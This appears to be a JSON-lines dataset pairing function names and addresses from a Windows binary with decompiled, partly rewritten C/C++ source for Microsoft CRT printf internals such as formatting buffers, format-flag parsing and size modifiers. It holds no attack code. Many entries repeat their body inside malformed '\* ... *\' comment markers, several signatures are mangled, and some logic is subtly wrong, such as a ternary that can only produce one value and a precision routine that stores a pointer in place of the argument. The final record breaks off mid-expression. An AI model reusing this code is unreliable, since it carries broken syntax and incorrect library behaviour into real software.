{"Function Name": "__crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>", "Address": "1001bb4a", "Source Code": "bool __thiscall\n__crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>\n(formatting_buffer *this, uint param_1)\n{\n    uint uVar1; \n    undefined4 *puVar2; \n    bool bVar3; \n    \n    if (((uint)(0xffffffff / (ulonglong)param_1) & 0xfffffffe) < 2) {\n        puVar2 = (undefined4 *)FUN_100253b8(); \n        *puVar2 = 0xc; \n        return false; \n    }\n    uVar1 = param_1 * 2; \n    \n    \n    if (((*(int *)(this + 0x404) == 0) && (uVar1 < 0x401)) || (uVar1 <= *(uint *)(this + 0x400))) {\n        return true; \n    }\n    \n    formatting_buffer *new_buffer = (formatting_buffer *)__malloc_base(uVar1);\n    bVar3 = new_buffer != (formatting_buffer *)0x0; \n    \n    if (bVar3) {\n        \n        __crt_unique_heap_ptr<char, struct___crt_internal_free_policy>::operator=\n        ((__crt_unique_heap_ptr<char, struct___crt_internal_free_policy> *)(this + 0x404),\n        (__crt_unique_heap_ptr<char, struct___crt_internal_free_policy> *)&new_buffer);\n        *(uint *)(this + 0x400) = uVar1; \n    }\n    \n    FID_conflict__free(new_buffer); \n    return bVar3; \n}"}
{"Function Name": "__crt_stdio_output::is_wide_character_specifier<char>", "Address": "1001bbd0", "Source Code": "bool __cdecl\n__crt_stdio_output::is_wide_character_specifier<char>\n(__uint64 param_1, char param_2, length_modifier param_3)\n{\n    \n    if (param_3 != 2) {\n        \n        if (param_3 == 3 || param_3 == 0xc) {\n            return true; \n        }\n        \n        if (param_3 != 0xd) {\n            \n            return !(param_2 != 'c' && param_2 != 's');\n        }\n    }\n    \n    return false;\n}"}
{"Function Name": "__crt_stdio_output::is_wide_character_specifier<wchar_t>", "Address": "1001bc10", "Source Code": "bool __cdecl\n__crt_stdio_output::is_wide_character_specifier<wchar_t>\n(__uint64 param_1, wchar_t param_2, length_modifier param_3)\n{\n    \n    if (param_3 == 2) {\n        return false; \n    }\n    \n    \n    if ((param_3 != 3) && (param_3 != 0xc) && (param_3 != 0xd)) {\n        \n        return ((param_1 & 4) != 0) == ((param_2 == L'c') || (param_2 == L's'));\n    }\n    \n    \n    return true;\n}"}
{"Function Name": "__crt_stdio_output::formatting_buffer::scratch_data<char>", "Address": "1001bc5f", "Source Code": "char * this_call crt_stdio_output::format_buffer::scratch_data_function<char>(format_buffer *buffer)\n{\n    \n    uint char_count = count<char>(buffer);\n    \n    \n    return (char *)((*(int *)(buffer + 0x404) == 0) ? \n                    (buffer + char_count) : \n                    (char_count + *(int *)(buffer + 0x404))); \n}"}
{"Function Name": "__crt_stdio_output::write_multiple_characters<class___crt_stdio_output::string_output_adapter<char>,char>", "Address": "1001be97", "Source Code": "void __cdecl\n__crt_stdio_output::\nwrite_multiple_characters<class___crt_stdio_output::string_output_adapter<char>,char>\n(string_output_adapter<char> *param_1,char param_2,int param_3,int *param_4)\n{\n    \n    if (param_3 > 0) {\n        \n        for (int i = 0; i < param_3; i++) {\n            \n            string_output_adapter<char>::write_character(param_1,param_2,param_4);\n            \n            if (*param_4 == -1) {\n                \n                return;\n            }\n        }\n    }\n}"}
{"Function Name": "__crt_stdio_output::write_multiple_characters<class___crt_stdio_output::string_output_adapter<wchar_t>,char>", "Address": "1001bec3", "Source Code": "void __cdecl\n__crt_stdio_output::\nwrite_multiple_characters<class___crt_stdio_output::string_output_adapter<wchar_t>,char>\n(string_output_adapter<wchar_t> *param_1,char param_2,int param_3,int *param_4)\n{\n    \n    if (param_3 > 0) {\n        \n        for (int i = 0; i < param_3; i++) {\n            \n            string_output_adapter<wchar_t>::write_character(param_1, (short)param_2, param_4);\n            \n            if (*param_4 == -1) {\n                \n                return;\n            }\n        }\n    }\n}"}
{"Function Name": "__crt_stdio_output::common_data<char>::common_data<char>", "Address": "1001bef4", "Source Code": "\\*\ncommon_data<char> * __thiscall\n__crt_stdio_output::common_data<char>::common_data<char>(common_data<char> *this)\n{\n    memset(this, 0, 0x448); \n    return this; \n}\n*\\ \n \ncommon_data<char> * __thiscall\n__crt_stdio_output::common_data<char>::common_data<char>(common_data<char> *this)\n{\n    memset(this, 0, 0x448); \n    return this;\n}"}
{"Function Name": "__crt_stdio_output::common_data<wchar_t>::common_data<wchar_t>", "Address": "1001bf3b", "Source Code": "\\*\ncommon_data<wchar_t> * __thiscall\n__crt_stdio_output::common_data<wchar_t>::common_data<wchar_t>(common_data<wchar_t> *this)\n{\n    \n    memset(this, 0, sizeof(common_data<wchar_t>));\n    \n    \n    return this;\n}\n*\\ \n \ncommon_data<wchar_t> * __thiscall\n__crt_stdio_output::common_data<wchar_t>::common_data<wchar_t>(common_data<wchar_t> *this)\n{\n    memset(this, 0, sizeof(common_data<wchar_t>));\n    return this;\n}"}
{"Function Name": "__crt_stdio_output::output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_>::output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_>", "Address": "1001bf87", "Source Code": "\\*\noutput_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_> * __thiscall\n__crt_stdio_output::output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_>\n::output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_>\n(output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_> *this,\nstring_output_adapter<char> *param_1,__uint64 param_2,char *param_3,\n__crt_locale_pointers *param_4)\n{\n    \n    common_data<char>::common_data<char>((common_data<char> *)this);\n    \n    \n    *(undefined4 *)(this + 0x448) = *(undefined4 *)param_1;\n    \n    \n    *(undefined4 *)this = *(undefined4 *)param_1; \n    \n    \n    *(undefined4 *)(this + 4) = (undefined4)param_2;\n    \n    \n    *(char **)(this + 8) = param_3;\n    \n    \n    *(__crt_locale_pointers **)(this + 0x14) = param_4;\n    \n    \n    return this;\n}\n*\\ \n \noutput_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_> * __thiscall\n__crt_stdio_output::output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_>\n::output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_>\n(output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_> *this,\nstring_output_adapter<char> *param_1,__uint64 param_2,char *param_3,\n__crt_locale_pointers *param_4)\n{\ncommon_data<char>::common_data<char>((common_data<char> *)this);\n*(undefined4 *)(this + 0x448) = *(undefined4 *)param_1;\n*(undefined4 *)this = *(undefined4 *)param_1; \n*(undefined4 *)(this + 4) = (undefined4)param_2;\n*(char **)(this + 8) = param_3;\n*(__crt_locale_pointers **)(this + 0x14) = param_4;\nreturn this;\n}"}
{"Function Name": "__crt_stdio_output::output_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>::output_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>", "Address": "1001bfc3", "Source Code": "\\*\noutput_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_> * __thiscall\n__crt_stdio_output::\noutput_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>::\noutput_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>\n(output_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>\n*this, string_output_adapter<wchar_t> *param_1, __uint64 param_2, wchar_t *param_3,\n__crt_locale_pointers *param_4)\n{\n    \n    common_data<wchar_t>::common_data<wchar_t>((common_data<wchar_t> *)this);\n    \n    \n    *(undefined4 *)(this + 0x448) = *(undefined4 *)param_1;\n    \n    \n    *(undefined4 *)(this + 4) = (undefined4)param_2;\n    \n    \n    *(wchar_t **)(this + 8) = param_3;\n    \n    \n    *(undefined4 *)(this + 0x10) = param_2._4_4_;\n    \n    \n    *(__crt_locale_pointers **)(this + 0x14) = param_4;\n    \n    \n    return this;\n}\n*\\ \n \noutput_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_> * __thiscall\n__crt_stdio_output::\noutput_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>::\noutput_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>\n(output_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>\n*this,string_output_adapter<wchar_t> *param_1,__uint64 param_2,wchar_t *param_3,\n__crt_locale_pointers *param_4)\n{\n    common_data<wchar_t>::common_data<wchar_t>((common_data<wchar_t> *)this);\n    *(undefined4 *)(this + 0x448) = *(undefined4 *)param_1;\n    *(undefined4 *)(this + 4) = (undefined4)param_2;\n    *(wchar_t **)(this + 8) = param_3;\n    *(undefined4 *)(this + 0x10) = param_2._4_4_;\n    *(__crt_locale_pointers **)(this + 0x14) = param_4;\n    return this;\n}"}
{"Function Name": "__crt_stdio_output::formatting_buffer::~formatting_buffer", "Address": "1001c082", "Source Code": "void __thiscall __crt_stdio_output::formatting_buffer::~formatting_buffer(formatting_buffer *buffer_instance)\n{\n    \n    free_memory(*(void **)(buffer_instance + 0x404));\n    \n    \n    *(void **)(buffer_instance + 0x404) = 0;\n}"}
{"Function Name": "__crt_unique_heap_ptr<char,struct___crt_internal_free_policy>::operator=", "Address": "1001c09c", "Source Code": "\\*\n__crt_unique_heap_ptr<char,struct___crt_internal_free_policy> * __thiscall\n__crt_unique_heap_ptr<char,struct___crt_internal_free_policy>::operator=\n(__crt_unique_heap_ptr<char,struct___crt_internal_free_policy> *this,\n__crt_unique_heap_ptr<char,struct___crt_internal_free_policy> *param_1)\n{\n    \n    FID_conflict__free(*(void **)this);\n    \n    \n    *(undefined4 *)this = *(undefined4 *)param_1;\n    \n    \n    *(undefined4 *)param_1 = 0;\n    \n    \n    return this;\n}\n*\\ \n \n__crt_unique_heap_ptr<char,struct___crt_internal_free_policy> * __thiscall\n__crt_unique_heap_ptr<char,struct___crt_internal_free_policy>::operator=\n(__crt_unique_heap_ptr<char,struct___crt_internal_free_policy> *this,\n__crt_unique_heap_ptr<char,struct___crt_internal_free_policy> *param_1)\n{\n    FID_conflict__free(*(void **)this);\n    *(undefined4 *)this = *(undefined4 *)param_1;\n    *(undefined4 *)param_1 = 0;\n    return this;\n}"}
{"Function Name": "__crt_stdio_output::crop_zeroes", "Address": "1001c0c0", "Source Code": "void __cdecl __crt_stdio_output::crop_zeroes(char *input_string, __crt_locale_pointers *locale_pointers)\n{\n    char current_char; \n    char *traverse_ptr = input_string; \n    \n    while (*traverse_ptr != '\\0' && *traverse_ptr != ***(char ***)(*(int *)locale_pointers + 0x88)) {\n        traverse_ptr++; \n    }\n    \n    if (*traverse_ptr != '\\0') {\n        do {\n            traverse_ptr++; \n            current_char = *traverse_ptr; \n            \n            if (current_char == '\\0' || current_char == 'e') break;\n        } while (current_char != 'E'); \n        \n        while (*--traverse_ptr == '0');\n        \n        if (*traverse_ptr == ***(char ***)(*(int *)locale_pointers + 0x88)) {\n            traverse_ptr--; \n        }\n        \n        while ((current_char = *input_string) != '\\0') {\n            *++traverse_ptr = current_char; \n            input_string++; \n        }\n    }\n}"}
{"Function Name": "__crt_stdio_output::force_decimal_point", "Address": "1001c183", "Source Code": "void __cdecl __crt_stdio_output::force_decimal_point(char *input_string, __crt_locale_pointers *locale_ptrs)\n{\n    int lowercase_char; \n    uint function_result; \n    byte temp_byte; \n    bool is_e_found; \n    lowercase_char = _tolower((int)*input_string); \n    is_e_found = lowercase_char == 0x65; \n    \n    \n    while (!is_e_found) {\n        input_string++; \n        function_result = FUN_1002699d((uint)(byte)*input_string); \n        is_e_found = function_result == 0; \n    }\n    \n    \n    if (_tolower((int)*input_string) == 0x78) {\n        input_string += 2; \n    }\n    \n    temp_byte = *input_string; \n    *input_string = ***(byte ***)(*(int *)locale_ptrs + 0x88); \n    \n    \n    do {\n        input_string++; \n        byte next_char = *input_string; \n        *input_string = temp_byte; \n        temp_byte = next_char; \n    } while (*input_string != 0); \n}"}
{"Function Name": "__crt_stdio_output::output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>::process", "Address": "1001c2d1", "Source Code": "\\*\nint __thiscall\n__crt_stdio_output::\noutput_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>\n::process(output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>\n*this)\n{\n    \n    output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>\n    oVar1; \n    byte bVar3; \n    char cVar4; \n    undefined4 *puVar5; \n    uint uVar7; \n    undefined4 uVar8; \n    int iVar6; \n    \n    if (!__crt_strtox::c_string_character_source<wchar_t>::validate((c_string_character_source<wchar_t> *)(this + 0x448))) {\n        return -1; \n    }\n    \n    \n    if (*(int *)(this + 0x10) == 0) {\n        puVar5 = (undefined4 *)FUN_100253b8(); \n        *puVar5 = 0x16; \n        FUN_1001de96(); \n    } else {\n        do {\n            *(int *)(this + 0x450) += 1; \n            if (*(int *)(this + 0x450) == 2) {\n                return *(int *)(this + 0x18); \n            }\n            *(undefined4 *)(this + 0x38) = 0; \n            *(undefined4 *)(this + 0x1c) = 0; \n            \n            oVar1 = **(output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>\n            **)(this + 0x10);\n            this[0x31] = oVar1; \n            \n            if (oVar1 != (output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_)0x0) {\n                *(int *)(this + 0x10) += 1; \n                if (*(int *)(this + 0x18) < 0) {\n                    goto LAB_1001c3b1; \n                }\n                bVar3 = find_next_state((char)this[0x31], *(int *)(this + 0x1c)); \n                iVar6 = (int)bVar3; \n                *(int *)(this + 0x1c) = iVar6; \n                \n                if (iVar6 == 8) {\n                    puVar5 = (undefined4 *)FUN_100253b8(); \n                    *puVar5 = 0x16; \n                    FUN_1001de96(); \n                }\n                \n                switch(iVar6) {\n                    case 0:\n                        uVar8 = state_case_normal((int)this); \n                        cVar4 = (char)uVar8; \n                        break;\n                    case 1:\n                        \n                        *(undefined4 *)(this + 0x28) = 0xffffffff; \n                        *(undefined4 *)(this + 0x24) = 0; \n                        this[0x30] = (output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_)0x0; \n                        *(undefined4 *)(this + 0x20) = 0; \n                        *(undefined4 *)(this + 0x2c) = 0; \n                        this[0x3c] = (output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_)0x0; \n                        break;\n                    case 2:\n                        uVar8 = state_case_flag((int)this); \n                        cVar4 = (char)uVar8; \n                        break;\n                    case 3:\n                        uVar8 = state_case_width(this); \n                        cVar4 = (char)uVar8; \n                        break;\n                    case 5:\n                        uVar8 = state_case_precision(this); \n                        cVar4 = (char)uVar8; \n                        break;\n                    case 6:\n                        uVar7 = state_case_size((__uint64 *)this); \n                        cVar4 = (char)uVar7; \n                        break;\n                    case 7:\n                        uVar8 = FUN_1001c9bd((__uint64 *)this); \n                        cVar4 = (char)uVar8; \n                        break;\n                    default:\n                        goto LAB_1001c3d6; \n                }\n                \n                if (cVar4 == '\\0') {\n                    return -1; \n                }\n            }\n            *(int *)(this + 0x10) += 1; \nLAB_1001c3b1:\n            uVar8 = validate_and_update_state_at_end_of_format_string((int)this); \n        } while ((char)uVar8 != '\\0'); \n    }\nLAB_1001c3d6:\n    return -1; \n}\n*\\ \n \nint __thiscall\n__crt_stdio_output::\noutput_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>\n::process(output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>\n*this)\n{\n    output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>\n    oVar1;\n    byte bVar3;\n    char cVar4;\n    undefined4 *puVar5;\n    uint uVar7;\n    undefined4 uVar8;\n    int iVar6;\n    if (!__crt_strtox::c_string_character_source<wchar_t>::validate((c_string_character_source<wchar_t> *)(this + 0x448))) {\n        return -1;\n    }\n    \n    if (*(int *)(this + 0x10) == 0) {\n        puVar5 = (undefined4 *)FUN_100253b8();\n        *puVar5 = 0x16;\n        FUN_1001de96();\n    } else {\n        do {\n            *(int *)(this + 0x450) += 1;\n            if (*(int *)(this + 0x450) == 2) {\n                return *(int *)(this + 0x18);\n            }\n            *(undefined4 *)(this + 0x38) = 0;\n            *(undefined4 *)(this + 0x1c) = 0;\n            oVar1 = **(output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>\n            **)(this + 0x10);\n            this[0x31] = oVar1;\n            if (oVar1 != (output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>)0x0) {\n                *(int *)(this + 0x10) += 1;\n                if (*(int *)(this + 0x18) < 0) {\n                    goto LAB_1001c3b1;\n                }\n                bVar3 = find_next_state((char)this[0x31], *(int *)(this + 0x1c));\n                iVar6 = (int)bVar3;\n                *(int *)(this + 0x1c) = iVar6;\n                if (iVar6 == 8) {\n                    puVar5 = (undefined4 *)FUN_100253b8();\n                    *puVar5 = 0x16;\n                    FUN_1001de96();\n                }\n                switch(iVar6) {\n                    case 0:\n                        uVar8 = state_case_normal((int)this);\n                        cVar4 = (char)uVar8;\n                        break;\n                    case 1:\n                        *(undefined4 *)(this + 0x28) = 0xffffffff;\n                        *(undefined4 *)(this + 0x24) = 0;\n                        this[0x30] = (output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_)0x0;\n                        *(undefined4 *)(this + 0x20) = 0;\n                        *(undefined4 *)(this + 0x2c) = 0;\n                        this[0x3c] = (output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_)0x0;\n                        break;\n                    case 2:\n                        uVar8 = state_case_flag((int)this);\n                        cVar4 = (char)uVar8;\n                        break;\n                    case 3:\n                        uVar8 = state_case_width(this);\n                        cVar4 = (char)uVar8;\n                        break;\n                    case 5:\n                        uVar8 = state_case_precision(this);\n                        cVar4 = (char)uVar8;\n                        break;\n                    case 6:\n                        uVar7 = state_case_size((__uint64 *)this);\n                        cVar4 = (char)uVar7;\n                        break;\n                    case 7:\n                        uVar8 = FUN_1001c9bd((__uint64 *)this);\n                        cVar4 = (char)uVar8;\n                        break;\n                    default:\n                        goto LAB_1001c3d6;\n                }\n                if (cVar4 == '\\0') {\n                    return -1;\n                }\n            }\n            *(int *)(this + 0x10) += 1;\nLAB_1001c3b1:\n            uVar8 = validate_and_update_state_at_end_of_format_string((int)this);\n        } while ((char)uVar8 != '\\0');\n    }\nLAB_1001c3d6:\n    return -1;\n}"}
{"Function Name": "state_case_flag", "Address": "1001c529", "Source Code": "undefined4 __fastcall state_case_flag(int input_param)\n{\n    \n    int character_value = (int)*(char *)(input_param + 0x31);\n    \n    \n    if (character_value == 0x20) {\n        \n        *(uint *)(input_param + 0x20) |= 2;\n    }\n    \n    else if (character_value == 0x23) {\n        \n        *(uint *)(input_param + 0x20) |= 0x20;\n    }\n    \n    else if (character_value == 0x2b) {\n        \n        *(uint *)(input_param + 0x20) |= 1;\n    }\n    \n    else if (character_value == 0x2d) {\n        \n        *(uint *)(input_param + 0x20) |= 4;\n    }\n    \n    else if (character_value >= 0x30 && character_value <= 0x39 && (character_value - 0x30) == 0) {\n        \n        *(uint *)(input_param + 0x20) |= 8;\n    }\n    \n    \n    return CONCAT31((int3)((uint)character_value >> 8), 1);\n}"}
{"Function Name": "state_case_flag", "Address": "1001c566", "Source Code": "undefined4 __fastcall state_case_flag(int input_address)\n{\n    \n    uint retrieved_value = (uint)*(ushort *)(input_address + 0x32);\n    \n    \n    if (retrieved_value == 0x20) {\n        \n        *(uint *)(input_address + 0x20) |= 2;\n    }\n    \n    else if (retrieved_value == 0x23) {\n        \n        *(uint *)(input_address + 0x20) |= 0x20;\n    }\n    \n    else if (retrieved_value == 0x2b) {\n        \n        *(uint *)(input_address + 0x20) |= 1;\n    }\n    \n    else if (retrieved_value == 0x2d) {\n        \n        *(uint *)(input_address + 0x20) |= 4;\n    }\n    \n    else if (retrieved_value - 0x30 == 0) {\n        \n        *(uint *)(input_address + 0x20) |= 8;\n    }\n    \n    \n    return CONCAT31((int3)((uint)(retrieved_value - 0x30) >> 8), 1);\n}"}
{"Function Name": "state_case_normal", "Address": "1001c5a3", "Source Code": "uint __fastcall state_case_normal(int input_param)\n{\n    \n    uint result = state_case_normal_common(input_param);\n    \n    \n    if ((char)result == '\\0') {\n        \n        *(undefined4 *)get_memory_location() = 0x16;\n        \n        \n        return get_another_value() & 0xffffff00;\n    }\n    \n    \n    return CONCAT31((int3)(result >> 8), 1);\n}"}
{"Function Name": "state_case_normal", "Address": "1001c5c2", "Source Code": "uint __fastcall state_case_normal(int input_param)\n{\n    \n    undefined4 result = state_case_normal_common(input_param);\n    \n    \n    if ((char)result == '\\0') {\n        \n        *(undefined4 *)get_address() = 0x16;\n        \n        \n        return get_value() & 0xffffff00;\n    }\n    \n    \n    return CONCAT31((int3)((uint)result >> 8), 1);\n}"}
{"Function Name": "state_case_normal_common", "Address": "1001c5e1", "Source Code": "uint __fastcall state_case_normal_common(int param_1)\n{\n    \n    uint uVar1 = state_case_normal_tchar(param_1);\n    \n    \n    if ((char)uVar1 == '\\0') {\n        \n        return uVar1;\n    }\n    \n    \n    __crt_stdio_output::string_output_adapter<char>::write_character\n    ((string_output_adapter<char> *)(param_1 + 0x448), \n    *(char *)(param_1 + 0x31), \n    (int *)(param_1 + 0x18)); \n    \n    \n    return 1;\n}"}
{"Function Name": "state_case_normal_common", "Address": "1001c60b", "Source Code": "undefined __fastcall state_case_normal_common(int param_1)\n{\n    \n    *(undefined *)(param_1 + 0x3c) = 1;\n    \n    \n    \n    __crt_stdio_output::string_output_adapter<wchar_t>::write_character\n    ((string_output_adapter<wchar_t> *)(param_1 + 0x448), *(wchar_t *)(param_1 + 0x32), (int *)(param_1 + 0x18));\n    \n    return 1;\n}"}
{"Function Name": "state_case_precision", "Address": "1001c687", "Source Code": "undefined4 __fastcall state_case_precision(void *input_pointer)\n{\n    int calculated_value; \n    \n    if (*(char *)((int)input_pointer + 0x31) != '*') {\n        \n        return FUN_1001c1df(input_pointer, (long *)((int)input_pointer + 0x28));\n    }\n    \n    *(int *)((int)input_pointer + 0x14) += 4;\n    \n    calculated_value = *(int *)((int)input_pointer + 0x14) - 4;\n    \n    *(int *)((int)input_pointer + 0x28) = calculated_value;\n    \n    if (calculated_value < 0) {\n        \n        *(undefined4 *)((int)input_pointer + 0x28) = 0xffffffff;\n    }\n    \n    return CONCAT31((int3)((uint)calculated_value >> 8), 1);\n}"}
{"Function Name": "state_case_precision", "Address": "1001c6af", "Source Code": "undefined4 __fastcall state_case_precision(void *input_pointer)\n{\n    int computed_value; \n    \n    if (*(short *)((int)input_pointer + 0x32) != 0x2a) {\n        \n        return FUN_1001c257(input_pointer, (long *)((int)input_pointer + 0x28));\n    }\n    \n    *(int *)((int)input_pointer + 0x14) += 4;\n    \n    computed_value = *(int *)((int)input_pointer + 0x14) - 4;\n    \n    *(int *)((int)input_pointer + 0x28) = computed_value;\n    \n    if (computed_value < 0) {\n        \n        *(undefined4 *)((int)input_pointer + 0x28) = 0xffffffff;\n    }\n    \n    return CONCAT31((int3)((uint)computed_value >> 8), 1);\n}"}
{"Function Name": "state_case_size", "Address": "1001c6d8", "Source Code": "uint __fastcall state_case_size(__uint64 *input_pointer)\n{\n    \n    char character_at_offset_31 = *(char *)((int)input_pointer + 0x31);\n    uint result_value;\n    \n    if (character_at_offset_31 == 'F') {\n        \n        if ((*(uint *)input_pointer & 8) == 0) {\n            \n            *(undefined4 *)((int)input_pointer + 0x1c) = 7;\n            \n            return FUN_1001c9bd(input_pointer);\n        }\n    } \n    \n    else if (character_at_offset_31 == 'N') {\n        \n        if ((*(uint *)input_pointer & 8) == 0) {\n            \n            *(undefined4 *)((int)input_pointer + 0x1c) = 8;\n            \n            undefined4 *function_result_pointer = (undefined4 *)FUN_100253b8();\n            \n            *function_result_pointer = 0x16;\n            \n            return FUN_1001de96() & 0xffffff00;\n        }\n    } \n    \n    else {\n        \n        if (*(int *)((int)input_pointer + 0x2c) != 0) {\n            goto LAB_1001c710; \n        }\n        \n        char *character_pointer = (char *)(int)character_at_offset_31;\n        \n        if ((int)character_pointer < 0x6b) {\n            \n            if (character_pointer == (char *)0x6a) {\n                \n                *(undefined4 *)((int)input_pointer + 0x2c) = 5;\n            } \n            \n            else if (character_pointer == (char *)0x49) {\n                \n                char *next_character_pointer = *(char **)(input_pointer + 2);\n                char next_character = *next_character_pointer; \n                \n                character_pointer = (char *)CONCAT31(character_at_offset_31 >> 7, next_character);\n                \n                if ((next_character == '3') && (next_character_pointer[1] == '2')) {\n                    character_pointer = next_character_pointer + 2; \n                    *(undefined4 *)((int)input_pointer + 0x2c) = 10; \n                    *(char **)(input_pointer + 2) = character_pointer; \n                } else if ((next_character == '6') && (next_character_pointer[1] == '4')) {\n                    character_pointer = next_character_pointer + 2; \n                    *(undefined4 *)((int)input_pointer + 0x2c) = 0xb; \n                    *(char **)(input_pointer + 2) = character_pointer; \n                } else if ((next_character == 'd') || (next_character == 'i') || (next_character == 'o') || (next_character == 'u') || (next_character == 'x') || (next_character == 'X')) {\n                    \n                    *(undefined4 *)((int)input_pointer + 0x2c) = 9;\n                }\n            } \n            \n            else if (character_pointer == (char *)0x4c) {\n                \n                *(undefined4 *)((int)input_pointer + 0x2c) = 8;\n            } \n            \n            else if (character_pointer == (char *)0x54) {\n                \n                *(undefined4 *)((int)input_pointer + 0x2c) = 0xd;\n            } \n            \n            else if (character_pointer == (char *)0x68) {\n                \n                char *next_character_pointer = *(char **)(input_pointer + 2);\n                \n                if (*next_character_pointer == 'h') {\n                    \n                    *(undefined4 *)((int)input_pointer + 0x2c) = 1;\n                    \n                    *(char **)(input_pointer + 2) = next_character_pointer + 1;\n                } else {\n                    \n                    *(undefined4 *)((int)input_pointer + 0x2c) = 2;\n                }\n            }\n        } \n        \n        else if (character_pointer == (char *)0x6c) {\n            \n            char *next_character_pointer = *(char **)(input_pointer + 2);\n            \n            if (*next_character_pointer == 'l') {\n                \n                *(undefined4 *)((int)input_pointer + 0x2c) = 4;\n                \n                *(char **)(input_pointer + 2) = next_character_pointer + 1;\n            } else {\n                \n                *(undefined4 *)((int)input_pointer + 0x2c) = 3;\n            }\n        } \n        \n        else if (character_pointer == (char *)0x74) {\n            \n            *(undefined4 *)((int)input_pointer + 0x2c) = 7;\n        } \n        \n        else if (character_pointer == (char *)0x77) {\n            \n            *(undefined4 *)((int)input_pointer + 0x2c) = 0xc;\n        } \n        \n        else if (character_pointer == (char *)0x7a) {\n            \n            *(undefined4 *)((int)input_pointer + 0x2c) = 6;\n        }\n    }\n    \n    return CONCAT31((int3)((uint)character_pointer >> 8), 1);\n}"}
{"Function Name": "state_case_size", "Address": "1001c841", "Source Code": "uint __fastcall state_case_size(__uint64 *input_param)\n{\n    ushort *ushort_pointer; \n    uint uint_value; \n    undefined4 *undefined_pointer; \n    \n    ushort_pointer = (ushort *)(uint)*(ushort *)((int)input_param + 0x32);\n    \n    \n    if (ushort_pointer == (ushort *)0x46) {\n        \n        if ((*(uint *)input_param & 8) == 0) {\n            *(undefined4 *)((int)input_param + 0x1c) = 7; \n            return FUN_1001cbed(input_param); \n        }\n    } \n    \n    else if (ushort_pointer == (ushort *)0x4e) {\n        \n        if ((*(uint *)input_param & 8) == 0) {\n            *(undefined4 *)((int)input_param + 0x1c) = 8; \n            undefined_pointer = (undefined4 *)FUN_100253b8(); \n            *undefined_pointer = 0x16; \n            return FUN_1001de96() & 0xffffff00; \n        }\n    } \n    \n    else {\n        \n        if (*(int *)((int)input_param + 0x2c) != 0) goto LAB_1001c87c; \n        \n        \n        if (ushort_pointer < (ushort *)0x6b) {\n            \n            if (ushort_pointer == (ushort *)0x6a) {\n                *(undefined4 *)((int)input_param + 0x2c) = 5; \n            } \n            \n            else if (ushort_pointer == (ushort *)0x49) {\n                ushort *secondary_ushort_pointer = *(ushort **)(input_param + 2); \n                ushort_pointer = (ushort *)(uint)*secondary_ushort_pointer; \n                \n                if ((ushort_pointer == (ushort *)0x33 && secondary_ushort_pointer[1] == 0x32) || \n                    (ushort_pointer == (ushort *)0x36 && secondary_ushort_pointer[1] == 0x34)) {\n                    ushort_pointer = secondary_ushort_pointer + 2; \n                    *(undefined4 *)((int)input_param + 0x2c) = (ushort_pointer == (ushort *)(uint)*secondary_ushort_pointer) ? 10 : 0xb; \n                    *(ushort **)(input_param + 2) = ushort_pointer; \n                } \n                \n                else if ((ushort_pointer == (ushort *)0x64) || (ushort_pointer == (ushort *)0x69) || \n                           (ushort_pointer == (ushort *)0x6f) || (ushort_pointer == (ushort *)0x75) || \n                           (ushort_pointer == (ushort *)0x78) 